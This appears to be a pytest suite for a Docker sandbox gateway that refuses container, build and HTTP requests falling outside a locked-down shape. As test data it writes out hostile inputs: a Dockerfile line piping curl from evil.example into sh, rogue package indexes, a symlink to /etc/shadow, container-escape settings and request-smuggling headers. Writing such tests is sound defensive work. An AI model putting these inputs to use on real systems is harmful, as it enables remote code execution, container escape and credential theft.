"""The sandbox gateway (Nodestro Local Docker): only locked-down tool containers reach the Docker daemon.

The unit tests check the policy on the requests the docker CLI really sends (captured from docker 29) and on
requests a compromised client could send. The protocol tests run the gateway against a stand-in daemon on a UNIX
socket. The tests marked ``docker`` run it against the real daemon (``NODESTRO_DOCKER_TESTS=1``) with the docker
CLI, build an image through it and run a tool in it.
"""

from __future__ import annotations

import asyncio
from collections.abc import AsyncIterator, Callable, Iterator
import contextlib
import copy
import gzip
import io
import json
import os
from pathlib import Path
import re
import shutil
import subprocess
import sys
import tarfile
import tempfile
import time
from typing import Any
from urllib.parse import unquote

import pytest

from nodestro_runtime import sandbox_gateway as gw
from nodestro_runtime.container_images import ContainerImages
from nodestro_runtime.sandbox_gateway import LABEL, TMPFS, Gateway, GatewayConfig, Refused, plan_build, plan_create

IMAGE = "nodestro-env:430e566d2514a584ae2837cde6129325"
CONFIG = GatewayConfig(instance="test")
HASH = "4721f391ed90541fddacab5acf947aa0d3dc7d27b2e1e8eda2be8970586c3274"
LOCK = f"six==1.17.0 \\\n    --hash=sha256:{HASH}\n    # via -r requirements.in\n"
PYTHON = f"{sys.version_info[0]}.{sys.version_info[1]}"
#: A real, public root certificate (Let's Encrypt), for build contexts with a CA bundle.
ISRG_ROOT_X1 = """\
-----BEGIN CERTIFICATE-----
MIIFazCCA1OgAwIBAgIRAIIQz7DSQONZRGPgu2OCiwAwDQYJKoZIhvcNAQELBQAw
TzELMAkGA1UEBhMCVVMxKTAnBgNVBAoTIEludGVybmV0IFNlY3VyaXR5IFJlc2Vh
cmNoIEdyb3VwMRUwEwYDVQQDEwxJU1JHIFJvb3QgWDEwHhcNMTUwNjA0MTEwNDM4
WhcNMzUwNjA0MTEwNDM4WjBPMQswCQYDVQQGEwJVUzEpMCcGA1UEChMgSW50ZXJu
ZXQgU2VjdXJpdHkgUmVzZWFyY2ggR3JvdXAxFTATBgNVBAMTDElTUkcgUm9vdCBY
MTCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBAK3oJHP0FDfzm54rVygc
h77ct984kIxuPOZXoHj3dcKi/vVqbvYATyjb3miGbESTtrFj/RQSa78f0uoxmyF+
0TM8ukj13Xnfs7j/EvEhmkvBioZxaUpmZmyPfjxwv60pIgbz5MDmgK7iS4+3mX6U
A5/TR5d8mUgjU+g4rk8Kb4Mu0UlXjIB0ttov0DiNewNwIRt18jA8+o+u3dpjq+sW
T8KOEUt+zwvo/7V3LvSye0rgTBIlDHCNAymg4VMk7BPZ7hm/ELNKjD+Jo2FR3qyH
B5T0Y3HsLuJvW5iB4YlcNHlsdu87kGJ55tukmi8mxdAQ4Q7e2RCOFvu396j3x+UC
B5iPNgiV5+I3lg02dZ77DnKxHZu8A/lJBdiB3QW0KtZB6awBdpUKD9jf1b0SHzUv
KBds0pjBqAlkd25HN7rOrFleaJ1/ctaJxQZBKT5ZPt0m9STJEadao0xAH0ahmbWn
OlFuhjuefXKnEgV4We0+UXgVCwOPjdAvBbI+e0ocS3MFEvzG6uBQE3xDk3SzynTn
jh8BCNAw1FtxNrQHusEwMFxIt4I7mKZ9YIqioymCzLq9gwQbooMDQaHWBfEbwrbw
qHyGO0aoSCqI3Haadr8faqU9GY/rOPNk3sgrDQoo//fb4hVC1CLQJ13hef4Y53CI
rU7m2Ys6xt0nUW7/vGT1M0NPAgMBAAGjQjBAMA4GA1UdDwEB/wQEAwIBBjAPBgNV
HRMBAf8EBTADAQH/MB0GA1UdDgQWBBR5tFnme7bl5AFzgAiIyBpY9umbbjANBgkq
hkiG9w0BAQsFAAOCAgEAVR9YqbyyqFDQDLHYGmkgJykIrGF1XIpu+ILlaS/V9lZL
ubhzEFnTIZd+50xx+7LSYK05qAvqFyFWhfFQDlnrzuBZ6brJFe+GnY+EgPbk6ZGQ
3BebYhtF8GaV0nxvwuo77x/Py9auJ/GpsMiu/X1+mvoiBOv/2X/qkSsisRcOj/KK
NFtY2PwByVS5uCbMiogziUwthDyC3+6WVwW6LLv3xLfHTjuCvjHIInNzktHCgKQ5
ORAzI4JMPJ+GslWYHb4phowim57iaztXOoJwTdwJx4nLCgdNbOhdjsnvzqvHu7Ur
TkXWStAmzOVyyghqpZXjFaH3pO3JLF+l+/+sKAIuvtd7u+Nxe5AW0wdeRlN8NwdC
jNPElpzVmbUq4JUagEiuTDkHzsxHpFKVK7q4+63SM1N95R1NbdWhscdCb+ZAJzVc
oyi3B43njTOQ5yOf+1CceWxG1bQVs5ZufpsMljq4Ui0/1lvh+wjChP4kqKOJ2qxq
4RgqsahDYVvTH9w7jXbyLeiNdd8XM2w9U/t7y0Ff/9yi0GE44Za4rF2LN9d11TPA
mRGunUHBcnWEvgJBQl9nJEiU0Zsnvgc/ubhPgXRR4Xq37Z0j4r7g1SgEEzwxA57d
emyPxgcYxn/eR44/KJ4EBs+lVDR3veyJm+kXQ99b21/+jh5Xos1AnX5iItreGCc=
-----END CERTIFICATE-----
"""

#: What ``docker run --rm -i --network none --read-only --cap-drop ALL ...`` (StreamedSandbox) sends, docker 29.
CLI_CREATE: dict[str, Any] = {
    "Hostname": "",
    "Domainname": "",
    "User": "65534:65534",
    "AttachStdin": True,
    "AttachStdout": True,
    "AttachStderr": True,
    "Tty": False,
    "OpenStdin": True,
    "StdinOnce": True,
    "Env": None,
    "Cmd": ["python", "-I", "-B", "-c", "print(1)"],
    "Image": IMAGE,
    "Volumes": {},
    "WorkingDir": "/work",
    "Entrypoint": None,
    "Labels": {},
    "NetworkingConfig": {"EndpointsConfig": {}},
    "HostConfig": {
        "Binds": None,
        "ContainerIDFile": "",
        "LogConfig": {"Type": "", "Config": {}},
        "NetworkMode": "none",
        "PortBindings": {},
        "RestartPolicy": {"Name": "no", "MaximumRetryCount": 0},
        "AutoRemove": True,
        "VolumeDriver": "",
        "VolumesFrom": None,
        "ConsoleSize": [0, 0],
        "CapAdd": None,
        "CapDrop": ["ALL"],
        "CgroupnsMode": "",
        "Dns": None,
        "DnsOptions": [],
        "DnsSearch": [],
        "ExtraHosts": None,
        "GroupAdd": None,
        "IpcMode": "",
        "Cgroup": "",
        "Links": None,
        "OomScoreAdj": 0,
        "PidMode": "",
        "Privileged": False,
        "PublishAllPorts": False,
        "ReadonlyRootfs": True,
        "SecurityOpt": ["no-new-privileges"],
        "Tmpfs": dict(TMPFS),
        "UTSMode": "",
        "UsernsMode": "",
        "ShmSize": 0,
        "Isolation": "",
        "CpuShares": 0,
        "Memory": 536870912,
        "NanoCpus": 1000000000,
        "CgroupParent": "",
        "BlkioWeight": 0,
        "BlkioWeightDevice": [],
        "Devices": [],
        "DeviceCgroupRules": None,
        "DeviceRequests": None,
        "MemoryReservation": 0,
        "MemorySwap": 536870912,
        "MemorySwappiness": -1,
        "OomKillDisable": False,
        "PidsLimit": 64,
        "Ulimits": None,
        "MaskedPaths": None,
        "ReadonlyPaths": None,
    },
}


def body(**changes: Any) -> dict[str, Any]:
    found = copy.deepcopy(CLI_CREATE)
    host = changes.pop("host", {})
    found.update(changes)
    found["HostConfig"].update(host)
    return found


# ---- containers ------------------------------------------------------------------------------------------------


def test_the_sandbox_request_of_the_docker_cli_is_accepted_and_locked_down() -> None:
    query, raw = plan_create({"name": "nodestro-sandbox-0123456789ab"}, body(), CONFIG)
    created = json.loads(raw)
    host = created["HostConfig"]
    assert query == {"name": "nodestro-sandbox-0123456789ab"}
    assert created["Image"] == IMAGE and created["Cmd"] == CLI_CREATE["Cmd"]
    assert created["User"] == "65534:65534" and created["NetworkDisabled"] is True
    assert created["Labels"] == {LABEL: "test"}
    assert host["NetworkMode"] == "none" and host["ReadonlyRootfs"] is True and host["Privileged"] is False
    assert host["CapDrop"] == ["ALL"] and host["SecurityOpt"] == ["no-new-privileges"]
    assert host["Memory"] == host["MemorySwap"] == 536870912 and host["PidsLimit"] == 64
    assert host["Tmpfs"] == TMPFS and host["AutoRemove"] is True
    assert host["IpcMode"] == "private" and host["Binds"] == host["Mounts"] == host["Devices"] == []
    # Nothing else of the request reaches the daemon.
    assert set(host) == {
        "NetworkMode",
        "ReadonlyRootfs",
        "CapDrop",
        "SecurityOpt",
        "Privileged",
        "IpcMode",
        "Binds",
        "Mounts",
        "Devices",
        "PidsLimit",
        "Memory",
        "MemorySwap",
        "NanoCpus",
        "Tmpfs",
        "AutoRemove",
        "Init",
        "Ulimits",
        "LogConfig",
    }


def test_missing_isolation_flags_are_added_not_trusted() -> None:
    """``ContainerImages.missing_modules`` asks only for --network none --read-only; the gateway adds the rest."""
    request = body(User="", host={"CapDrop": None, "SecurityOpt": None, "Memory": 0, "NanoCpus": 0, "PidsLimit": 0})
    request["HostConfig"].pop("Tmpfs")
    query, raw = plan_create({}, request, CONFIG)
    created = json.loads(raw)
    assert query["name"].startswith("nodestro-sandbox-")
    assert created["User"] == "65534:65534"
    assert created["HostConfig"]["CapDrop"] == ["ALL"]
    assert created["HostConfig"]["SecurityOpt"] == ["no-new-privileges"]
    assert created["HostConfig"]["Memory"] == CONFIG.max_memory_mb * 1024 * 1024
    assert created["HostConfig"]["PidsLimit"] == CONFIG.max_pids


@pytest.mark.parametrize(
    ("change", "reason"),
    [
        ({"Image": "alpine"}, "sandbox images"),
        ({"Image": "nodestro-env:latest"}, "sandbox images"),
        ({"host": {"Privileged": True}}, "Privileged"),
        ({"host": {"Binds": ["/:/host"]}}, "Binds"),
        ({"host": {"Mounts": [{"Type": "bind", "Source": "/", "Target": "/host"}]}}, "Mounts"),
        ({"host": {"VolumesFrom": ["nodestro"]}}, "VolumesFrom"),
        ({"host": {"CapAdd": ["SYS_ADMIN"]}}, "CapAdd"),
        ({"host": {"NetworkMode": "host"}}, "no network"),
        ({"host": {"NetworkMode": "bridge"}}, "no network"),
        ({"host": {"NetworkMode": "container:nodestro"}}, "no network"),
        ({"host": {"PidMode": "host"}}, "PidMode"),
        ({"host": {"IpcMode": "host"}}, "IpcMode"),
        ({"host": {"UTSMode": "host"}}, "UTSMode"),
        ({"host": {"UsernsMode": "host"}}, "UsernsMode"),
        ({"host": {"CgroupnsMode": "host"}}, "CgroupnsMode"),
        ({"host": {"SecurityOpt": ["seccomp=unconfined"]}}, "no-new-privileges"),
        ({"host": {"SecurityOpt": ["apparmor=unconfined"]}}, "no-new-privileges"),
        ({"host": {"MaskedPaths": []}}, "MaskedPaths"),
        ({"host": {"ReadonlyPaths": []}}, "ReadonlyPaths"),
        ({"host": {"Devices": [{"PathOnHost": "/dev/kvm"}]}}, "Devices"),
        ({"host": {"DeviceRequests": [{"Count": -1}]}}, "DeviceRequests"),
        ({"host": {"PortBindings": {"80/tcp": [{"HostPort": "80"}]}}}, "PortBindings"),
        ({"host": {"Runtime": "runc-unsafe"}}, "Runtime"),
        ({"host": {"Sysctls": {"kernel.x": "1"}}}, "Sysctls"),
        ({"host": {"CgroupParent": "/"}}, "CgroupParent"),
        ({"host": {"OomKillDisable": True}}, "OomKillDisable"),
        ({"host": {"Tmpfs": {"/etc": "rw,exec"}}}, "temporary file systems"),
        ({"host": {"Memory": 64 * 1024**3}}, "memory"),
        ({"host": {"NanoCpus": 64 * 10**9}}, "CPUs"),
        ({"host": {"PidsLimit": 100000}}, "processes"),
        ({"Tty": True}, "terminal"),
        ({"User": "0:0"}, "nobody"),
        ({"WorkingDir": "/"}, "/work"),
        ({"Entrypoint": ["/bin/sh"]}, "Entrypoint"),
        ({"ExposedPorts": {"80/tcp": {}}}, "ExposedPorts"),
        ({"Volumes": {"/data": {}}}, "Volumes"),
        ({"NetworkingConfig": {"EndpointsConfig": {"bridge": {}}}}, "no network"),
        ({"Cmd": []}, "command"),
    ],
)
def test_a_container_outside_the_sandbox_shape_is_refused(change: dict[str, Any], reason: str) -> None:
    with pytest.raises(Refused, match=reason):
        plan_create({}, body(**change), CONFIG)


@pytest.mark.parametrize("name", ["nodestro", "evil", "nodestro-sandbox-../x", "nodestro-sandbox-" + "a" * 80])
def test_container_names_are_restricted(name: str) -> None:
    with pytest.raises(Refused, match="name"):
        plan_create({"name": name}, body(), CONFIG)


# ---- endpoints -------------------------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("method", "path"),
    [
        ("GET", "/v1.51/containers/json"),
        ("POST", "/v1.51/containers/abc/exec"),
        ("POST", "/v1.51/exec/abc/start"),
        ("PUT", "/v1.51/containers/abc/archive"),
        ("GET", "/v1.51/containers/abc/archive"),
        ("POST", "/v1.51/containers/abc/update"),
        ("POST", "/v1.51/containers/abc/commit"),
        ("GET", "/v1.51/containers/abc/logs"),
        ("POST", "/v1.51/images/create"),
        ("POST", "/v1.51/images/load"),
        ("GET", "/v1.51/images/json"),
        ("GET", "/v1.51/images/python:3.13-slim/json"),
        ("DELETE", "/v1.51/images/python:3.13-slim"),
        ("POST", "/v1.51/volumes/create"),
        ("POST", "/v1.51/networks/create"),
        ("GET", "/v1.51/events"),
        ("POST", "/v1.51/session"),
        ("POST", "/grpc"),
        ("POST", "/v1.51/swarm/init"),
        ("POST", "/v1.51/plugins/pull"),
        ("POST", "/v1.51/auth"),
        ("POST", "/v1.51/build/prune"),
        ("DELETE", "/v1.51/containers/abc/attach"),
    ],
)
def test_every_other_endpoint_is_refused(method: str, path: str) -> None:
    with pytest.raises(Refused):
        gw.route(method, path)


def test_the_endpoints_of_the_sandboxes_are_routed() -> None:
    assert gw.route("HEAD", "/_ping") == ("ping", "")
    assert gw.route("GET", "/v1.51/info") == ("ping", "")
    assert gw.route("POST", "/v1.51/containers/create") == ("create", "")
    assert gw.route("POST", "/v1.51/build") == ("build", "")
    assert gw.route("POST", "/v1.51/containers/nodestro-sandbox-x/attach") == ("container:attach", "nodestro-sandbox-x")
    assert gw.route("DELETE", "/v1.51/containers/nodestro-sandbox-x") == ("container:delete", "nodestro-sandbox-x")
    assert gw.route("GET", f"/v1.51/images/{IMAGE}/json") == ("image:inspect", IMAGE)
    assert gw.route("DELETE", f"/v1.51/images/{IMAGE}") == ("image:delete", IMAGE)


# ---- image builds ----------------------------------------------------------------------------------------------


def _context(lock: str = LOCK, *, ca: bool = False) -> tuple[str, bytes]:
    """The tag and tar context that ContainerImages.build sends to docker for ``lock``."""
    captured: dict[str, Any] = {}

    def run(args: list[str], **_: Any) -> subprocess.CompletedProcess[str]:
        if args[1] == "build":
            context = Path(args[-1])
            buffer = io.BytesIO()
            with tarfile.open(fileobj=buffer, mode="w") as archive:
                for path in sorted(context.rglob("*")):
                    archive.add(path, arcname=str(path.relative_to(context)), recursive=False)
            captured["tag"] = args[args.index("-t") + 1]
            captured["tar"] = buffer.getvalue()
            return subprocess.CompletedProcess(args, 0, "", "")
        return subprocess.CompletedProcess(args, 1, "", "No such image")

    with tempfile.NamedTemporaryFile("w", suffix=".pem", delete=False) as handle:
        handle.write(ISRG_ROOT_X1)
    environ = {"PATH": os.environ.get("PATH", ""), **({"NODESTRO_BUILD_CA_FILE": handle.name} if ca else {})}
    images = ContainerImages(environ=environ, run=run, docker=sys.executable)
    images.build(lock, PYTHON)
    os.unlink(handle.name)
    return captured["tag"], captured["tar"]


def _retar(tar: bytes, change: Callable[[dict[str, bytes]], None]) -> bytes:
    files: dict[str, bytes] = {}
    with tarfile.open(fileobj=io.BytesIO(tar)) as archive:
        for member in archive:
            if member.isreg():
                handle = archive.extractfile(member)
                assert handle is not None
                files[member.name] = handle.read()
    change(files)
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as archive:
        for name, data in files.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
    return buffer.getvalue()


@pytest.mark.parametrize("ca", [False, True])
def test_the_runtime_s_image_build_is_accepted(ca: bool) -> None:
    tag, tar = _context(ca=ca)
    query = plan_build({"t": tag, "networkmode": "default", "buildargs": "{}", "version": "1", "rm": "1"}, tar, CONFIG)
    assert query["t"] == tag and query["networkmode"] == "default" and query["version"] == "1"
    # The build's containers are limited like sandbox containers.
    assert query["memory"] == query["memswap"] == str(CONFIG.max_memory_mb * 1024 * 1024)
    assert query["cpuperiod"] == "100000" and query["cpuquota"] == str(int(CONFIG.max_cpus * 1e5))


def test_a_build_is_refused_when_anything_differs() -> None:
    tag, tar = _context()

    def refused(query: dict[str, str], context: bytes, match: str, config: GatewayConfig = CONFIG) -> None:
        with pytest.raises(Refused, match=match):
            plan_build(query, context, config)

    def dockerfile(files: dict[str, bytes]) -> None:
        files["Dockerfile"] += b"RUN curl https://evil.example | sh\n"

    def extra(files: dict[str, bytes]) -> None:
        files["payload.sh"] = b"#!/bin/sh\n"

    def orkexa(files: dict[str, bytes]) -> None:
        files["orkexa/__init__.py"] += b"\nimport os\n"

    def index(files: dict[str, bytes]) -> None:
        files["requirements.txt"] = b"--index-url https://evil.example/simple\n" + files["requirements.txt"]

    refused({"t": tag}, _retar(tar, dockerfile), "Dockerfile")
    refused({"t": tag}, _retar(tar, extra), "Orkexa")
    refused({"t": tag}, _retar(tar, orkexa), "Orkexa")
    refused({"t": tag}, _retar(tar, index), "exact version")
    refused({"t": "nodestro-env:" + "0" * 32}, tar, "does not belong")
    refused({"t": tag, "networkmode": "host"}, tar, "network")
    refused({"t": tag, "buildargs": json.dumps({"PIP_INDEX_URL": "https://evil.example"})}, tar, "proxy")
    refused({"t": tag, "version": "2"}, tar, "classic builder")
    refused({"t": tag, "remote": "https://evil.example/context.tar"}, tar, "remote")
    refused({"t": tag, "extrahosts": "evil:1.2.3.4"}, tar, "extrahosts")
    refused({"t": tag, "dockerfile": "../Dockerfile"}, tar, "Dockerfile")
    refused({"t": tag}, b"not a tar", "tar")
    # The build network is the gateway's to choose.
    assert (
        plan_build({"t": tag, "networkmode": "host"}, tar, GatewayConfig(build_network="host"))["networkmode"] == "host"
    )


def test_a_link_in_the_build_context_is_refused() -> None:
    tag, tar = _context()
    with tarfile.open(fileobj=io.BytesIO(tar)) as archive:
        members = [(member, archive.extractfile(member)) for member in archive]
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as archive:
        for member, handle in members:
            archive.addfile(member, handle)
        link = tarfile.TarInfo("orkexa/escape")
        link.type = tarfile.SYMTYPE
        link.linkname = "/etc/shadow"
        archive.addfile(link)
    with pytest.raises(Refused, match="only files"):
        plan_build({"t": tag}, buffer.getvalue(), CONFIG)


@pytest.mark.parametrize(
    "lock",
    [
        "six==1.17.0\n",
        f"six>=1.0 --hash=sha256:{HASH}\n",
        f"six @ https://evil.example/six.whl --hash=sha256:{HASH}\n",
        f"-r /etc/passwd\nsix==1.17.0 --hash=sha256:{HASH}\n",
        f"-e git+https://evil.example/x#egg=x\nsix==1.17.0 --hash=sha256:{HASH}\n",
        "",
    ],
)
def test_only_exact_hashed_locks_are_built(lock: str) -> None:
    with pytest.raises(Refused):
        gw.check_lock(lock)


def test_markers_and_extras_are_allowed_in_a_lock() -> None:
    gw.check_lock(
        f"pydantic[email]==2.11.0 ; python_version >= '3.10' \\\n"
        f"    --hash=sha256:{HASH} \\\n    --hash=sha256:{HASH}\n"
    )


def test_limits_come_from_the_environment() -> None:
    config = GatewayConfig.from_env(
        {
            "NODESTRO_SANDBOX_MAX_CONTAINERS": "2",
            "NODESTRO_SANDBOX_INSTANCE": "local-1",
            "NODESTRO_SANDBOX_MAX_CPUS": "1.5",
        }
    )
    assert (config.max_containers, config.instance, config.max_cpus) == (2, "local-1", 1.5)
    for bad in (
        {"NODESTRO_SANDBOX_MAX_PIDS": "x"},
        {"NODESTRO_SANDBOX_INSTANCE": "a b"},
        {"NODESTRO_SANDBOX_BUILD_NETWORK": "bridge2"},
    ):
        with pytest.raises(SystemExit):
            GatewayConfig.from_env(bad)


# ---- the protocol, against a stand-in daemon -------------------------------------------------------------------


class FakeDaemon:
    """A Docker daemon stand-in on a UNIX socket: records requests, creates containers, echoes attached stdin."""

    def __init__(self) -> None:
        self.requests: list[tuple[str, str, bytes]] = []
        self.containers: dict[str, dict[str, Any]] = {}
        self.created = 0
        #: What ``/info`` reports about the daemon's resource limits and security options.
        self.limits = True
        self.security_options = ["name=seccomp,profile=builtin", "name=cgroupns"]
        #: What ``/images/json`` lists (the environment images on the daemon).
        self.images: list[dict[str, Any]] = []

    async def handle(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        request = await gw.read_request(reader, limit=1 << 26)
        assert request is not None
        self.requests.append((request.method, request.target, request.body))
        path = request.path
        if path.endswith("/containers/create"):
            self.created += 1
            container_id = f"{self.created:064x}"
            name = request.query["name"]
            self.containers[container_id] = {
                "Id": container_id,
                "Names": [f"/{name}"],
                "Created": int(time.time()),
                "State": "created",
            }
            answer = json.dumps({"Id": container_id, "Warnings": []}).encode()
            writer.write(b"HTTP/1.1 201 Created\r\nContent-Type: application/json\r\n")
            writer.write(f"Content-Length: {len(answer)}\r\n\r\n".encode() + answer)
        elif path.endswith("/info"):
            features = ("MemoryLimit", "PidsLimit", "CpuCfsQuota", "CpuCfsPeriod")
            info: dict[str, Any] = {name: self.limits for name in features}
            info["SecurityOptions"] = self.security_options
            answer = json.dumps(info).encode()
            writer.write(f"HTTP/1.1 200 OK\r\nContent-Length: {len(answer)}\r\n\r\n".encode() + answer)
        elif path.endswith("/attach"):
            writer.write(b"HTTP/1.1 101 UPGRADED\r\nConnection: Upgrade\r\nUpgrade: tcp\r\n\r\n")
            data = await reader.read()  # until the client half-closes
            writer.write(data.upper())
            await writer.drain()
            writer.write_eof()
        elif path.endswith("/images/json"):
            answer = json.dumps(self.images).encode()
            writer.write(f"HTTP/1.1 200 OK\r\nContent-Length: {len(answer)}\r\n\r\n".encode() + answer)
        elif path.startswith("/containers/json") or path.endswith("/containers/json"):
            answer = json.dumps(list(self.containers.values())).encode()
            writer.write(f"HTTP/1.1 200 OK\r\nContent-Length: {len(answer)}\r\n\r\n".encode() + answer)
        elif request.method == "DELETE" and "/containers/" in path:
            self.containers.pop(path.rsplit("/", 1)[1], None)
            writer.write(b"HTTP/1.1 204 No Content\r\n\r\n")
        else:
            writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK")
        await writer.drain()
        writer.close()


@pytest.fixture
async def gateway(tmp_path: Path) -> AsyncIterator[tuple[FakeDaemon, str, Gateway]]:
    daemon = FakeDaemon()
    daemon_socket = str(tmp_path / "daemon.sock")
    server = await asyncio.start_unix_server(daemon.handle, path=daemon_socket)
    config = GatewayConfig(docker=daemon_socket, instance="test", max_containers=2, max_lifetime=60)
    instance = Gateway(config)
    listen = str(tmp_path / "gateway.sock")
    front = await asyncio.start_unix_server(instance.handle, path=listen)
    async with server, front:
        yield daemon, listen, instance


async def _send(socket_path: str, raw: bytes, *, half_close: bool = False) -> bytes:
    reader, writer = await asyncio.open_unix_connection(socket_path)
    writer.write(raw)
    await writer.drain()
    if half_close:
        writer.write_eof()
    data = await reader.read()
    writer.close()
    return data


# ---- adversarial requests (request smuggling, rewritten targets, non-upgraded attach) -----------------------------


@pytest.mark.parametrize(
    "head",
    [
        # A bare line feed ends the header for the daemon's parser and starts a second, unchecked request.
        b"GET /_ping HTTP/1.1\r\nHost: d\r\nUser-Agent: x\n\nGET /containers/json HTTP/1.1\nHost: d\n\r\n\r\n",
        b"GET /_ping HTTP/1.1\r\nHost: d\r\nAccept: x\nX-Registry-Auth: e30=\r\n\r\n",
        b"GET /_ping HTTP/1.1\r\nHost: d\r\nAccept: a\rb\r\n\r\n",
        b"GET /_ping HTTP/1.1\r\nHost: d\r\nAccept: a\x00b\r\n\r\n",
        b"GET /_ping HTTP/1.1\r\nHost: d\r\n folded: header\r\n\r\n",
        b"GET /_ping HTTP/1.1\r\nBad Header: x\r\n\r\n",
        # Targets the daemon could read as another path: a fragment, absolute form, spaces, no leading slash.
        b"GET /_ping#/../containers/json HTTP/1.1\r\nHost: d\r\n\r\n",
        b"GET http://docker/containers/json HTTP/1.1\r\nHost: d\r\n\r\n",
        b"GET /_ping /containers/json HTTP/1.1\r\nHost: d\r\n\r\n",
        b"GET * HTTP/1.1\r\nHost: d\r\n\r\n",
        b"CONNECT /_ping HTTP/1.1\r\nHost: d\r\n\r\n",
        b"GET /_ping HTTP/2\r\nHost: d\r\n\r\n",
    ],
)
def test_ambiguous_request_heads_are_refused(head: bytes) -> None:
    with pytest.raises(Refused) as refused:
        gw.parse_head(head)
    assert refused.value.status == 400


async def test_a_smuggled_request_never_reaches_the_daemon(gateway: tuple[FakeDaemon, str, Gateway]) -> None:
    daemon, listen, _ = gateway
    smuggled = (
        b"GET /_ping HTTP/1.1\r\nHost: d\r\nUser-Agent: x\n\nGET /containers/json?all=1 HTTP/1.1\nHost: d\n\r\n\r\n"
    )
    answer = await _send(listen, smuggled)
    assert answer.startswith(b"HTTP/1.1 400") and b"Nodestro sandbox gateway" in answer
    assert daemon.requests == []


async def test_forwarded_targets_are_rebuilt_from_what_was_checked(gateway: tuple[FakeDaemon, str, Gateway]) -> None:
    daemon, listen, _ = gateway
    await _send(listen, b"GET /v1.51/_ping?anything=1&x=%2F..%2Fcontainers HTTP/1.1\r\nHost: d\r\n\r\n")
    assert daemon.requests[-1][1] == "/v1.51/_ping"
    image = "nodestro-env:" + "a" * 32
    await _send(listen, f"GET /v1.51/images/{image.replace(':', '%3A')}/json HTTP/1.1\r\nHost: d\r\n\r\n".encode())
    assert daemon.requests[-1][1] == f"/v1.51/images/{image}/json"
    await _send(listen, f"DELETE /images/{image}?force=1 HTTP/1.1\r\nHost: d\r\n\r\n".encode())
    assert daemon.requests[-1][:2] == ("DELETE", f"/images/{image}?force=1")


async def test_a_large_body_is_refused_before_it_is_read(gateway: tuple[FakeDaemon, str, Gateway]) -> None:
    daemon, listen, _ = gateway
    head = b"POST /containers/create HTTP/1.1\r\nHost: d\r\nContent-Length: 10000000\r\n\r\n"
    answer = await _send(listen, head)  # no body sent: the gateway must answer on the head alone
    assert answer.startswith(b"HTTP/1.1 413") and daemon.requests == []
    both = b"POST /containers/create HTTP/1.1\r\nHost: d\r\nContent-Length: 2\r\nTransfer-Encoding: chunked\r\n\r\n{}"
    assert (await _send(listen, both)).startswith(b"HTTP/1.1 400")


class _KeepAliveDaemon(FakeDaemon):
    """A daemon that answers attach without switching protocols and then reads further requests (keep-alive)."""

    async def handle(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        if not self.containers:
            await super().handle(reader, writer)
            return
        while True:
            request = await gw.read_request(reader, limit=1 << 20)
            if request is None:
                break
            self.requests.append((request.method, request.target, request.body))
            writer.write(b"HTTP/1.1 409 Conflict\r\nContent-Length: 7\r\n\r\nstopped")
            await writer.drain()
        writer.close()


async def test_client_bytes_pass_only_through_a_switched_attach(tmp_path: Path) -> None:
    daemon = _KeepAliveDaemon()
    daemon_socket = str(tmp_path / "daemon.sock")
    server = await asyncio.start_unix_server(daemon.handle, path=daemon_socket)
    instance = Gateway(GatewayConfig(docker=daemon_socket, instance="test", max_containers=2))
    listen = str(tmp_path / "gateway.sock")
    front = await asyncio.start_unix_server(instance.handle, path=listen)
    async with server, front:
        await _send(listen, _post("/containers/create?name=nodestro-sandbox-ka", body()))
        container_id = next(iter(daemon.containers))
        before = len(daemon.requests)
        attach = (
            f"POST /containers/{container_id}/attach?stream=1&stdin=1 HTTP/1.1\r\nHost: d\r\n"
            "Connection: Upgrade\r\nUpgrade: tcp\r\n\r\n"
        ).encode()
        smuggled = b"POST /containers/create HTTP/1.1\r\nHost: d\r\nContent-Length: 2\r\n\r\n{}"
        answer = await asyncio.wait_for(_send(listen, attach + smuggled, half_close=True), timeout=20)
    assert answer.startswith(b"HTTP/1.1 409")
    forwarded = [target for _, target, _ in daemon.requests[before:]]
    assert forwarded == [f"/containers/{container_id}/attach?stream=1&stdin=1"]


def _post(path: str, payload: Any) -> bytes:
    data = json.dumps(payload).encode()
    return (
        f"POST {path} HTTP/1.1\r\nHost: docker\r\nContent-Type: application/json\r\n"
        f"Content-Length: {len(data)}\r\n\r\n".encode()
        + data
    )


async def test_a_created_container_is_locked_down_and_usable(gateway: tuple[FakeDaemon, str, Gateway]) -> None:
    daemon, listen, _ = gateway
    answer = await _send(listen, _post("/v1.51/containers/create?name=nodestro-sandbox-aaaa", body()))
    assert answer.startswith(b"HTTP/1.1 201")
    _, target, forwarded = daemon.requests[-1]
    created = json.loads(forwarded)
    assert target == "/v1.51/containers/create?name=nodestro-sandbox-aaaa"
    assert created["HostConfig"]["NetworkMode"] == "none" and created["Labels"] == {LABEL: "test"}
    # The container can be attached to (stdin, half-close, output) by its ID, and removed by its name.
    container_id = next(iter(daemon.containers))
    attach = (
        f"POST /v1.51/containers/{container_id}/attach?stdin=1&stdout=1&stream=1 HTTP/1.1\r\nHost: docker\r\n"
        "Connection: Upgrade\r\nUpgrade: tcp\r\n\r\nhello"
    ).encode()
    answer = await _send(listen, attach, half_close=True)
    assert answer.startswith(b"HTTP/1.1 101") and answer.endswith(b"HELLO")
    answer = await _send(listen, b"DELETE /v1.51/containers/nodestro-sandbox-aaaa?force=1 HTTP/1.1\r\nHost: d\r\n\r\n")
    assert answer.startswith(b"HTTP/1.1 204")
    assert daemon.requests[-1][1] == f"/v1.51/containers/{container_id}?force=1"


async def test_containers_the_gateway_did_not_create_cannot_be_used(gateway: tuple[FakeDaemon, str, Gateway]) -> None:
    daemon, listen, _ = gateway
    for raw in (
        b"POST /v1.51/containers/nodestro/attach?stdin=1 HTTP/1.1\r\nHost: d\r\n"
        b"Connection: Upgrade\r\nUpgrade: tcp\r\n\r\n",
        b"DELETE /v1.51/containers/nodestro?force=1 HTTP/1.1\r\nHost: d\r\n\r\n",
        b"POST /v1.51/containers/nodestro/kill HTTP/1.1\r\nHost: d\r\nContent-Length: 0\r\n\r\n",
